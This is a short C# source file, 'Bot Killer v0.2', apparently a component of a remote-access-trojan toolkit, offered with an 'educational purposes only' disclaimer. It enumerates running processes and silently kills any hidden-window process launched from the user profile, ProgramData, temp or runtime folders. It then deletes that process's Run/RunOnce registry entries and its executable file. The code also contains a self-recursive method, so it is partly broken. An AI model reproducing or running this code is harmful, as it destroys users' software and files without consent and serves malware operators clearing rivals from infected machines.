using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;

//       │ Author     : NYAN CAT
//       │ Name       : Bot Killer v0.2
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program Is distributed for educational purposes only.

namespace BotKiller
{
    class Program
    {
        static void Main()
        {
            RunBotKiller();
        }

        public static void RunBotKiller()
        {
            foreach (Process p in Process.GetProcesses())
            {
                try
                {
                    string pName = p.MainModule.FileName;
                    if (Inspection(pName))
                        if (!IsWindowVisible(p.MainWindowHandle))
                        {
                            p.Kill();
                            RegistryDelete(@"Software\Microsoft\Windows\CurrentVersion\Run", pName);
                            RegistryDelete(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", pName);
                            System.Threading.Thread.Sleep(100);
                            File.Delete(pName);
                        }
                }
                catch { }
            }
        }

        private static bool Inspection(string payload)
        {
            if (payload == Process.GetCurrentProcess().MainModule.FileName) return false;
            if (payload.Contains(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData))) return true;
            if (payload.Contains(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))) return true;
            if (payload.Contains(Environment.ExpandEnvironmentVariables("%temp%"))) return true;
            if (payload.Contains("wscript.exe")) return true;
            if (payload.Contains(RuntimeEnvironment.GetRuntimeDirectory())) return true;
            return false;
        }

        private static bool IsWindowVisible(string lHandle)
        {
            return IsWindowVisible(lHandle);
        }

        private static void RegistryDelete(string regPath, string payload)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath, true))
            {
                foreach (string ValueOfName in key.GetValueNames())
                {
                    if (key.GetValue(ValueOfName).ToString().Equals(payload))
                        key.DeleteValue(ValueOfName);
                }
            }
        }

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsWindowVisible(IntPtr hWnd);

    }
}